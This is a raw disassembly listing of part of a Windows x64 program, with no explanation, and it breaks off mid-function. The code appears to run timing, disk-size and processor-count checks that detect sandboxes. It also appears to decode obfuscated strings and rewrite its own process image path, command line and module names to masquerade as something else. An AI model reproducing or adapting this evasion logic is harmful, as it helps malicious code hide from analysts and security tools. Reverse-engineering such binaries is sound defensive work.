  401797:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40179e:	00 00 
  4017a0:	56                   	push   %rsi
  4017a1:	53                   	push   %rbx
  4017a2:	48 83 ec 78          	sub    $0x78,%rsp
  4017a6:	0f 29 74 24 60       	movaps %xmm6,0x60(%rsp)
  4017ab:	89 ce                	mov    %ecx,%esi
  4017ad:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  4017b2:	ff 15 80 ce 0d 00    	call   *0xdce80(%rip)        # 0x4de638
  4017b8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  4017bd:	48 8b 1d 6c ce 0d 00 	mov    0xdce6c(%rip),%rbx        # 0x4de630
  4017c4:	ff d3                	call   *%rbx
  4017c6:	f2 0f 10 35 52 7d 0d 	movsd  0xd7d52(%rip),%xmm6        # 0x4d9520
  4017cd:	00 
  4017ce:	66 90                	xchg   %ax,%ax
  4017d0:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%rsp)
  4017d7:	00 
  4017d8:	45 31 c0             	xor    %r8d,%r8d
  4017db:	31 d2                	xor    %edx,%edx
  4017dd:	0f 1f 00             	nopl   (%rax)
  4017e0:	89 d0                	mov    %edx,%eax
  4017e2:	41 89 d2             	mov    %edx,%r10d
  4017e5:	44 8b 4c 24 2c       	mov    0x2c(%rsp),%r9d
  4017ea:	83 e0 3f             	and    $0x3f,%eax
  4017ed:	41 c1 fa 02          	sar    $0x2,%r10d
  4017f1:	83 c2 01             	add    $0x1,%edx
  4017f4:	41 0f af c2          	imul   %r10d,%eax
  4017f8:	44 31 c0             	xor    %r8d,%eax
  4017fb:	41 83 c0 0d          	add    $0xd,%r8d
  4017ff:	44 01 c8             	add    %r9d,%eax
  401802:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
  401808:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
  40180c:	75 d2                	jne    0x4017e0
  40180e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  401813:	ff d3                	call   *%rbx
  401815:	f2 48 0f 2a 4c 24 30 	cvtsi2sdq 0x30(%rsp),%xmm1
  40181c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
  401821:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
  401826:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  40182b:	f2 0f 59 c6          	mulsd  %xmm6,%xmm0
  40182f:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
  401833:	f2 48 0f 2a ce       	cvtsi2sd %rsi,%xmm1
  401838:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  40183c:	77 92                	ja     0x4017d0
  40183e:	0f 28 74 24 60       	movaps 0x60(%rsp),%xmm6
  401843:	48 83 c4 78          	add    $0x78,%rsp
  401847:	5b                   	pop    %rbx
  401848:	5e                   	pop    %rsi
  401849:	c3                   	ret
  40184a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401850:	56                   	push   %rsi
  401851:	53                   	push   %rbx
  401852:	48 81 ec c8 00 00 00 	sub    $0xc8,%rsp
  401859:	0f 29 74 24 70       	movaps %xmm6,0x70(%rsp)
  40185e:	0f 29 bc 24 80 00 00 	movaps %xmm7,0x80(%rsp)
  401865:	00 
  401866:	44 0f 29 84 24 90 00 	movaps %xmm8,0x90(%rsp)
  40186d:	00 00 
  40186f:	44 0f 29 8c 24 a0 00 	movaps %xmm9,0xa0(%rsp)
  401876:	00 00 
  401878:	44 0f 29 94 24 b0 00 	movaps %xmm10,0xb0(%rsp)
  40187f:	00 00 
  401881:	66 45 0f 57 c0       	xorpd  %xmm8,%xmm8
  401886:	31 db                	xor    %ebx,%ebx
  401888:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  40188d:	ff 15 a5 cd 0d 00    	call   *0xdcda5(%rip)        # 0x4de638
  401893:	48 8d 0d ce 77 0d 00 	lea    0xd77ce(%rip),%rcx        # 0x4d9068
  40189a:	e8 11 87 00 00       	call   0x409fb0
  40189f:	48 8b 35 8a cd 0d 00 	mov    0xdcd8a(%rip),%rsi        # 0x4de630
  4018a6:	f2 0f 10 3d 7a 7c 0d 	movsd  0xd7c7a(%rip),%xmm7        # 0x4d9528
  4018ad:	00 
  4018ae:	f2 0f 10 35 7a 7c 0d 	movsd  0xd7c7a(%rip),%xmm6        # 0x4d9530
  4018b5:	00 
  4018b6:	f2 44 0f 10 0d 61 7c 	movsd  0xd7c61(%rip),%xmm9        # 0x4d9520
  4018bd:	0d 00 
  4018bf:	90                   	nop
  4018c0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  4018c5:	83 c3 01             	add    $0x1,%ebx
  4018c8:	ff d6                	call   *%rsi
  4018ca:	b9 2c 01 00 00       	mov    $0x12c,%ecx
  4018cf:	e8 cc fe ff ff       	call   0x4017a0
  4018d4:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
  4018d9:	ff d6                	call   *%rsi
  4018db:	f2 48 0f 2a 4c 24 40 	cvtsi2sdq 0x40(%rsp),%xmm1
  4018e2:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  4018e7:	48 2b 44 24 50       	sub    0x50(%rsp),%rax
  4018ec:	48 8d 0d 99 77 0d 00 	lea    0xd7799(%rip),%rcx        # 0x4d908c
  4018f3:	89 da                	mov    %ebx,%edx
  4018f5:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  4018fa:	f2 41 0f 59 c1       	mulsd  %xmm9,%xmm0
  4018ff:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
  401903:	66 0f 28 c8          	movapd %xmm0,%xmm1
  401907:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
  40190d:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  401912:	66 0f 28 d0          	movapd %xmm0,%xmm2
  401916:	f2 0f 5d ce          	minsd  %xmm6,%xmm1
  40191a:	f2 44 0f 58 c0       	addsd  %xmm0,%xmm8
  40191f:	66 0f 28 f1          	movapd %xmm1,%xmm6
  401923:	66 0f 28 c8          	movapd %xmm0,%xmm1
  401927:	f2 0f 5f cf          	maxsd  %xmm7,%xmm1
  40192b:	66 0f 28 f9          	movapd %xmm1,%xmm7
  40192f:	e8 84 86 00 00       	call   0x409fb8
  401934:	83 fb 0a             	cmp    $0xa,%ebx
  401937:	75 87                	jne    0x4018c0
  401939:	f2 44 0f 5e 05 f6 7b 	divsd  0xd7bf6(%rip),%xmm8        # 0x4d9538
  401940:	0d 00 
  401942:	f2 0f 11 7c 24 38    	movsd  %xmm7,0x38(%rsp)
  401948:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
  40194d:	f2 0f 11 74 24 38    	movsd  %xmm6,0x38(%rsp)
  401953:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  401958:	48 8d 0d 49 77 0d 00 	lea    0xd7749(%rip),%rcx        # 0x4d90a8
  40195f:	66 0f 28 d6          	movapd %xmm6,%xmm2
  401963:	66 0f 28 df          	movapd %xmm7,%xmm3
  401967:	f2 0f 10 05 d1 7b 0d 	movsd  0xd7bd1(%rip),%xmm0        # 0x4d9540
  40196e:	00 
  40196f:	f2 0f 10 0d d9 7b 0d 	movsd  0xd7bd9(%rip),%xmm1        # 0x4d9550
  401976:	00 
  401977:	f2 44 0f 10 15 e0 7b 	movsd  0xd7be0(%rip),%xmm10        # 0x4d9560
  40197e:	0d 00 
  401980:	66 45 0f 28 c8       	movapd %xmm8,%xmm9
  401985:	f2 44 0f 11 44 24 38 	movsd  %xmm8,0x38(%rsp)
  40198c:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401991:	f2 44 0f 5c c8       	subsd  %xmm0,%xmm9
  401996:	66 44 0f 54 c9       	andpd  %xmm1,%xmm9
  40199b:	66 41 0f 28 c8       	movapd %xmm8,%xmm1
  4019a0:	f2 44 0f 5e c8       	divsd  %xmm0,%xmm9
  4019a5:	f2 45 0f 59 d1       	mulsd  %xmm9,%xmm10
  4019aa:	f2 44 0f 11 54 24 20 	movsd  %xmm10,0x20(%rsp)
  4019b1:	e8 02 86 00 00       	call   0x409fb8
  4019b6:	66 44 0f 2e 0d a9 7b 	ucomisd 0xd7ba9(%rip),%xmm9        # 0x4d9568
  4019bd:	0d 00 
  4019bf:	dd 05 ab 7b 0d 00    	fldl   0xd7bab(%rip)        # 0x4d9570
  4019c5:	dd 5c 24 38          	fstpl  0x38(%rsp)
  4019c9:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  4019cf:	73 5f                	jae    0x401a30
  4019d1:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  4019d6:	f2 44 0f 11 54 24 38 	movsd  %xmm10,0x38(%rsp)
  4019dd:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  4019e2:	66 41 0f 28 ca       	movapd %xmm10,%xmm1
  4019e7:	48 8d 0d 62 77 0d 00 	lea    0xd7762(%rip),%rcx        # 0x4d9150
  4019ee:	e8 c5 85 00 00       	call   0x409fb8
  4019f3:	b8 01 00 00 00       	mov    $0x1,%eax
  4019f8:	0f 28 74 24 70       	movaps 0x70(%rsp),%xmm6
  4019fd:	0f 28 bc 24 80 00 00 	movaps 0x80(%rsp),%xmm7
  401a04:	00 
  401a05:	44 0f 28 84 24 90 00 	movaps 0x90(%rsp),%xmm8
  401a0c:	00 00 
  401a0e:	44 0f 28 8c 24 a0 00 	movaps 0xa0(%rsp),%xmm9
  401a15:	00 00 
  401a17:	44 0f 28 94 24 b0 00 	movaps 0xb0(%rsp),%xmm10
  401a1e:	00 00 
  401a20:	48 81 c4 c8 00 00 00 	add    $0xc8,%rsp
  401a27:	5b                   	pop    %rbx
  401a28:	5e                   	pop    %rsi
  401a29:	c3                   	ret
  401a2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401a30:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  401a35:	f2 44 0f 11 54 24 38 	movsd  %xmm10,0x38(%rsp)
  401a3c:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401a41:	66 41 0f 28 ca       	movapd %xmm10,%xmm1
  401a46:	48 8d 0d 93 76 0d 00 	lea    0xd7693(%rip),%rcx        # 0x4d90e0
  401a4d:	e8 66 85 00 00       	call   0x409fb8
  401a52:	31 c0                	xor    %eax,%eax
  401a54:	eb a2                	jmp    0x4019f8
  401a56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401a5d:	00 00 00 
  401a60:	55                   	push   %rbp
  401a61:	57                   	push   %rdi
  401a62:	56                   	push   %rsi
  401a63:	53                   	push   %rbx
  401a64:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
  401a6b:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
  401a72:	00 
  401a73:	0f 29 bc 24 90 00 00 	movaps %xmm7,0x90(%rsp)
  401a7a:	00 
  401a7b:	31 c9                	xor    %ecx,%ecx
  401a7d:	bb 41 00 00 00       	mov    $0x41,%ebx
  401a82:	be 01 00 00 00       	mov    $0x1,%esi
  401a87:	ff 15 ab cc 0d 00    	call   *0xdccab(%rip)        # 0x4de738
  401a8d:	89 c1                	mov    %eax,%ecx
  401a8f:	66 0f 57 f6          	xorpd  %xmm6,%xmm6
  401a93:	e8 28 85 00 00       	call   0x409fc0
  401a98:	48 8d 0d 11 77 0d 00 	lea    0xd7711(%rip),%rcx        # 0x4d91b0
  401a9f:	e8 0c 85 00 00       	call   0x409fb0
  401aa4:	ff 15 06 cb 0d 00    	call   *0xdcb06(%rip)        # 0x4de5b0
  401aaa:	c7 44 24 30 41 3a 5c 	movl   $0x5c3a41,0x30(%rsp)
  401ab1:	00 
  401ab2:	89 c7                	mov    %eax,%edi
  401ab4:	48 8b 2d dd ca 0d 00 	mov    0xdcadd(%rip),%rbp        # 0x4de598
  401abb:	f2 0f 10 3d b5 7a 0d 	movsd  0xd7ab5(%rip),%xmm7        # 0x4d9578
  401ac2:	00 
  401ac3:	eb 08                	jmp    0x401acd
  401ac5:	83 c3 01             	add    $0x1,%ebx
  401ac8:	83 fb 5b             	cmp    $0x5b,%ebx
  401acb:	74 64                	je     0x401b31
  401acd:	8d 4b bf             	lea    -0x41(%rbx),%ecx
  401ad0:	89 f0                	mov    %esi,%eax
  401ad2:	d3 e0                	shl    %cl,%eax
  401ad4:	85 f8                	test   %edi,%eax
  401ad6:	74 ed                	je     0x401ac5
  401ad8:	45 31 c9             	xor    %r9d,%r9d
  401adb:	31 d2                	xor    %edx,%edx
  401add:	88 5c 24 30          	mov    %bl,0x30(%rsp)
  401ae1:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
  401ae6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  401aeb:	ff d5                	call   *%rbp
  401aed:	85 c0                	test   %eax,%eax
  401aef:	74 d4                	je     0x401ac5
  401af1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401af6:	48 85 c0             	test   %rax,%rax
  401af9:	0f 88 e1 00 00 00    	js     0x401be0
  401aff:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  401b04:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  401b08:	48 8d 0d cb 76 0d 00 	lea    0xd76cb(%rip),%rcx        # 0x4d91da
  401b0f:	89 da                	mov    %ebx,%edx
  401b11:	83 c3 01             	add    $0x1,%ebx
  401b14:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  401b1a:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  401b1f:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  401b23:	66 0f 28 d0          	movapd %xmm0,%xmm2
  401b27:	e8 8c 84 00 00       	call   0x409fb8
  401b2c:	83 fb 5b             	cmp    $0x5b,%ebx
  401b2f:	75 9c                	jne    0x401acd
  401b31:	f2 0f 11 74 24 28    	movsd  %xmm6,0x28(%rsp)
  401b37:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  401b3c:	48 8d 0d aa 76 0d 00 	lea    0xd76aa(%rip),%rcx        # 0x4d91ed
  401b43:	66 0f 28 ce          	movapd %xmm6,%xmm1
  401b47:	e8 6c 84 00 00       	call   0x409fb8
  401b4c:	f2 0f 10 05 2c 7a 0d 	movsd  0xd7a2c(%rip),%xmm0        # 0x4d9580
  401b53:	00 
  401b54:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
  401b58:	0f 87 a2 00 00 00    	ja     0x401c00
  401b5e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  401b63:	ff 15 6f ca 0d 00    	call   *0xdca6f(%rip)        # 0x4de5d8
  401b69:	8b 5c 24 70          	mov    0x70(%rsp),%ebx
  401b6d:	48 8d 0d cf 76 0d 00 	lea    0xd76cf(%rip),%rcx        # 0x4d9243
  401b74:	89 da                	mov    %ebx,%edx
  401b76:	e8 3d 84 00 00       	call   0x409fb8
  401b7b:	83 fb 01             	cmp    $0x1,%ebx
  401b7e:	0f 86 9b 00 00 00    	jbe    0x401c1f
  401b84:	e8 3f 84 00 00       	call   0x409fc8
  401b89:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  401b8e:	89 c1                	mov    %eax,%ecx
  401b90:	f7 ea                	imul   %edx
  401b92:	89 c8                	mov    %ecx,%eax
  401b94:	c1 f8 1f             	sar    $0x1f,%eax
  401b97:	c1 fa 05             	sar    $0x5,%edx
  401b9a:	29 c2                	sub    %eax,%edx
  401b9c:	b8 64 00 00 00       	mov    $0x64,%eax
  401ba1:	0f af d0             	imul   %eax,%edx
  401ba4:	29 d1                	sub    %edx,%ecx
  401ba6:	83 c1 32             	add    $0x32,%ecx
  401ba9:	ff 15 c1 ca 0d 00    	call   *0xdcac1(%rip)        # 0x4de670
  401baf:	48 8d 0d d2 76 0d 00 	lea    0xd76d2(%rip),%rcx        # 0x4d9288
  401bb6:	e8 f5 83 00 00       	call   0x409fb0
  401bbb:	b8 01 00 00 00       	mov    $0x1,%eax
  401bc0:	0f 28 b4 24 80 00 00 	movaps 0x80(%rsp),%xmm6
  401bc7:	00 
  401bc8:	0f 28 bc 24 90 00 00 	movaps 0x90(%rsp),%xmm7
  401bcf:	00 
  401bd0:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
  401bd7:	5b                   	pop    %rbx
  401bd8:	5e                   	pop    %rsi
  401bd9:	5f                   	pop    %rdi
  401bda:	5d                   	pop    %rbp
  401bdb:	c3                   	ret
  401bdc:	0f 1f 40 00          	nopl   0x0(%rax)
  401be0:	48 89 c2             	mov    %rax,%rdx
  401be3:	83 e0 01             	and    $0x1,%eax
  401be6:	48 d1 ea             	shr    $1,%rdx
  401be9:	48 09 c2             	or     %rax,%rdx
  401bec:	f2 48 0f 2a c2       	cvtsi2sd %rdx,%xmm0
  401bf1:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
  401bf5:	e9 0a ff ff ff       	jmp    0x401b04
  401bfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401c00:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  401c06:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  401c0b:	48 8d 0d f6 75 0d 00 	lea    0xd75f6(%rip),%rcx        # 0x4d9208
  401c12:	66 0f 28 c8          	movapd %xmm0,%xmm1
  401c16:	e8 9d 83 00 00       	call   0x409fb8
  401c1b:	31 c0                	xor    %eax,%eax
  401c1d:	eb a1                	jmp    0x401bc0
  401c1f:	48 8d 0d 32 76 0d 00 	lea    0xd7632(%rip),%rcx        # 0x4d9258
  401c26:	ba 01 00 00 00       	mov    $0x1,%edx
  401c2b:	e8 88 83 00 00       	call   0x409fb8
  401c30:	31 c0                	xor    %eax,%eax
  401c32:	eb 8c                	jmp    0x401bc0
  401c34:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  401c3b:	00 00 00 00 00 
  401c40:	48 83 ec 28          	sub    $0x28,%rsp
  401c44:	48 8d 0d 6d 76 0d 00 	lea    0xd766d(%rip),%rcx        # 0x4d92b8
  401c4b:	e8 60 83 00 00       	call   0x409fb0
  401c50:	e8 fb fb ff ff       	call   0x401850
  401c55:	e8 06 fe ff ff       	call   0x401a60
  401c5a:	85 c0                	test   %eax,%eax
  401c5c:	0f 95 c0             	setne  %al
  401c5f:	0f b6 c0             	movzbl %al,%eax
  401c62:	48 83 c4 28          	add    $0x28,%rsp
  401c66:	c3                   	ret
  401c67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401c6e:	00 00 
  401c70:	41 57                	push   %r15
  401c72:	41 56                	push   %r14
  401c74:	41 55                	push   %r13
  401c76:	41 54                	push   %r12
  401c78:	55                   	push   %rbp
  401c79:	57                   	push   %rdi
  401c7a:	56                   	push   %rsi
  401c7b:	53                   	push   %rbx
  401c7c:	48 81 ec 08 07 00 00 	sub    $0x708,%rsp
  401c83:	48 8d 15 05 78 0d 00 	lea    0xd7805(%rip),%rdx        # 0x4d948f
  401c8a:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401c91:	00 
  401c92:	e8 09 fa ff ff       	call   0x4016a0
  401c97:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401c9e:	00 
  401c9f:	ff 15 1b c9 0d 00    	call   *0xdc91b(%rip)        # 0x4de5c0
  401ca5:	48 85 c0             	test   %rax,%rax
  401ca8:	48 89 c3             	mov    %rax,%rbx
  401cab:	0f 84 b8 02 00 00    	je     0x401f69
  401cb1:	48 8d 15 e8 77 0d 00 	lea    0xd77e8(%rip),%rdx        # 0x4d94a0
  401cb8:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401cbf:	00 
  401cc0:	e8 db f9 ff ff       	call   0x4016a0
  401cc5:	48 8b 35 fc c8 0d 00 	mov    0xdc8fc(%rip),%rsi        # 0x4de5c8
  401ccc:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
  401cd3:	00 
  401cd4:	48 89 d9             	mov    %rbx,%rcx
  401cd7:	ff d6                	call   *%rsi
  401cd9:	48 8d 15 e0 77 0d 00 	lea    0xd77e0(%rip),%rdx        # 0x4d94c0
  401ce0:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401ce7:	00 
  401ce8:	49 89 c4             	mov    %rax,%r12
  401ceb:	e8 b0 f9 ff ff       	call   0x4016a0
  401cf0:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
  401cf7:	00 
  401cf8:	48 89 d9             	mov    %rbx,%rcx
  401cfb:	ff d6                	call   *%rsi
  401cfd:	48 8d 15 dc 77 0d 00 	lea    0xd77dc(%rip),%rdx        # 0x4d94e0
  401d04:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401d0b:	00 
  401d0c:	48 89 c7             	mov    %rax,%rdi
  401d0f:	e8 8c f9 ff ff       	call   0x4016a0
  401d14:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
  401d1b:	00 
  401d1c:	48 89 d9             	mov    %rbx,%rcx
  401d1f:	ff d6                	call   *%rsi
  401d21:	48 8d 15 d8 77 0d 00 	lea    0xd77d8(%rip),%rdx        # 0x4d9500
  401d28:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401d2f:	00 
  401d30:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  401d35:	e8 66 f9 ff ff       	call   0x4016a0
  401d3a:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
  401d41:	00 
  401d42:	48 89 d9             	mov    %rbx,%rcx
  401d45:	ff d6                	call   *%rsi
  401d47:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
  401d4c:	ff 15 36 c8 0d 00    	call   *0xdc836(%rip)        # 0x4de588
  401d52:	31 d2                	xor    %edx,%edx
  401d54:	41 89 c0             	mov    %eax,%r8d
  401d57:	b9 38 04 00 00       	mov    $0x438,%ecx
  401d5c:	ff 15 c6 c8 0d 00    	call   *0xdc8c6(%rip)        # 0x4de628
  401d62:	48 85 c0             	test   %rax,%rax
  401d65:	48 89 c5             	mov    %rax,%rbp
  401d68:	0f 84 fb 01 00 00    	je     0x401f69
  401d6e:	48 8d 44 24 54       	lea    0x54(%rsp),%rax
  401d73:	31 d2                	xor    %edx,%edx
  401d75:	41 b9 30 00 00 00    	mov    $0x30,%r9d
  401d7b:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
  401d80:	48 89 e9             	mov    %rbp,%rcx
  401d83:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401d88:	41 ff d4             	call   *%r12
  401d8b:	85 c0                	test   %eax,%eax
  401d8d:	0f 85 cd 01 00 00    	jne    0x401f60
  401d93:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
  401d9a:	00 00 
  401d9c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401da3:	00 00 
  401da5:	41 b9 08 00 00 00    	mov    $0x8,%r9d
  401dab:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
  401db0:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
  401db5:	48 89 e9             	mov    %rbp,%rcx
  401db8:	4c 8b 25 81 c8 0d 00 	mov    0xdc881(%rip),%r12        # 0x4de640
  401dbf:	41 ff d4             	call   *%r12
  401dc2:	85 c0                	test   %eax,%eax
  401dc4:	0f 84 96 01 00 00    	je     0x401f60
  401dca:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401dcf:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
  401dd4:	0f 84 86 01 00 00    	je     0x401f60
  401dda:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
  401ddf:	0f 84 7b 01 00 00    	je     0x401f60
  401de5:	ba 04 01 00 00       	mov    $0x104,%edx
  401dea:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
  401df1:	00 
  401df2:	ff 15 f8 c7 0d 00    	call   *0xdc7f8(%rip)        # 0x4de5f0
  401df8:	4c 8d 05 d7 74 0d 00 	lea    0xd74d7(%rip),%r8        # 0x4d92d6
  401dff:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
  401e06:	00 
  401e07:	ba 04 01 00 00       	mov    $0x104,%edx
  401e0c:	e8 bf 81 00 00       	call   0x409fd0
  401e11:	b9 08 02 00 00       	mov    $0x208,%ecx
  401e16:	e8 55 81 00 00       	call   0x409f70
  401e1b:	48 85 c0             	test   %rax,%rax
  401e1e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  401e23:	0f 84 37 01 00 00    	je     0x401f60
  401e29:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  401e2e:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
  401e35:	00 
  401e36:	ba 04 01 00 00       	mov    $0x104,%edx
  401e3b:	e8 98 81 00 00       	call   0x409fd8
  401e40:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401e45:	48 8b 48 38          	mov    0x38(%rax),%rcx
  401e49:	ff d7                	call   *%rdi
  401e4b:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401e50:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401e55:	48 8b 48 20          	mov    0x20(%rax),%rcx
  401e59:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401e5e:	48 83 c1 60          	add    $0x60,%rcx
  401e62:	ff d0                	call   *%rax
  401e64:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401e69:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401e6e:	48 8b 48 20          	mov    0x20(%rax),%rcx
  401e72:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401e77:	48 83 c1 70          	add    $0x70,%rcx
  401e7b:	ff d0                	call   *%rax
  401e7d:	48 8d 94 24 e0 02 00 	lea    0x2e0(%rsp),%rdx
  401e84:	00 
  401e85:	31 c9                	xor    %ecx,%ecx
  401e87:	41 b8 04 01 00 00    	mov    $0x104,%r8d
  401e8d:	ff 15 25 c7 0d 00    	call   *0xdc725(%rip)        # 0x4de5b8
  401e93:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401e98:	48 8b 50 18          	mov    0x18(%rax),%rdx
  401e9c:	4c 8b 7a 10          	mov    0x10(%rdx),%r15
  401ea0:	4c 8d 6a 10          	lea    0x10(%rdx),%r13
  401ea4:	4d 39 fd             	cmp    %r15,%r13
  401ea7:	0f 84 8d 00 00 00    	je     0x401f3a
  401ead:	48 8d 9c 24 f0 04 00 	lea    0x4f0(%rsp),%rbx
  401eb4:	00 
  401eb5:	45 31 f6             	xor    %r14d,%r14d
  401eb8:	48 89 de             	mov    %rbx,%rsi
  401ebb:	eb 0f                	jmp    0x401ecc
  401ebd:	0f 1f 00             	nopl   (%rax)
  401ec0:	4d 8b 3f             	mov    (%r15),%r15
  401ec3:	4d 39 fd             	cmp    %r15,%r13
  401ec6:	0f 84 b4 00 00 00    	je     0x401f80
  401ecc:	48 89 df             	mov    %rbx,%rdi
  401ecf:	4c 89 f0             	mov    %r14,%rax
  401ed2:	b9 41 00 00 00       	mov    $0x41,%ecx
  401ed7:	f3 48 ab             	rep stos %rax,(%rdi)
  401eda:	49 8b 57 50          	mov    0x50(%r15),%rdx
  401ede:	49 89 f0             	mov    %rsi,%r8
  401ee1:	48 89 e9             	mov    %rbp,%rcx
  401ee4:	48 89 f3             	mov    %rsi,%rbx
  401ee7:	45 0f b7 4f 48       	movzwl 0x48(%r15),%r9d
  401eec:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  401ef3:	00 00 
  401ef5:	41 ff d4             	call   *%r12
  401ef8:	85 c0                	test   %eax,%eax
  401efa:	74 c4                	je     0x401ec0
  401efc:	48 89 f2             	mov    %rsi,%rdx
  401eff:	48 8d 8c 24 e0 02 00 	lea    0x2e0(%rsp),%rcx
  401f06:	00 
  401f07:	4c 8b 05 3a c8 0d 00 	mov    0xdc83a(%rip),%r8        # 0x4de748
  401f0e:	41 ff d0             	call   *%r8
  401f11:	85 c0                	test   %eax,%eax
  401f13:	75 ab                	jne    0x401ec0
  401f15:	49 8d 4f 48          	lea    0x48(%r15),%rcx
  401f19:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401f1e:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401f23:	ff d0                	call   *%rax
  401f25:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
  401f2a:	49 8d 4f 58          	lea    0x58(%r15),%rcx
  401f2e:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401f33:	ff d0                	call   *%rax
  401f35:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401f3a:	48 8b 48 38          	mov    0x38(%rax),%rcx
  401f3e:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  401f43:	ff d0                	call   *%rax
  401f45:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  401f4a:	e8 91 80 00 00       	call   0x409fe0
  401f4f:	48 89 e9             	mov    %rbp,%rcx
  401f52:	ff 15 10 c6 0d 00    	call   *0xdc610(%rip)        # 0x4de568
  401f58:	b8 01 00 00 00       	mov    $0x1,%eax
  401f5d:	eb 0c                	jmp    0x401f6b
  401f5f:	90                   	nop
  401f60:	48 89 e9             	mov    %rbp,%rcx
  401f63:	ff 15 ff c5 0d 00    	call   *0xdc5ff(%rip)        # 0x4de568
  401f69:	31 c0                	xor    %eax,%eax
  401f6b:	48 81 c4 08 07 00 00 	add    $0x708,%rsp
  401f72:	5b                   	pop    %rbx
  401f73:	5e                   	pop    %rsi
  401f74:	5f                   	pop    %rdi
  401f75:	5d                   	pop    %rbp
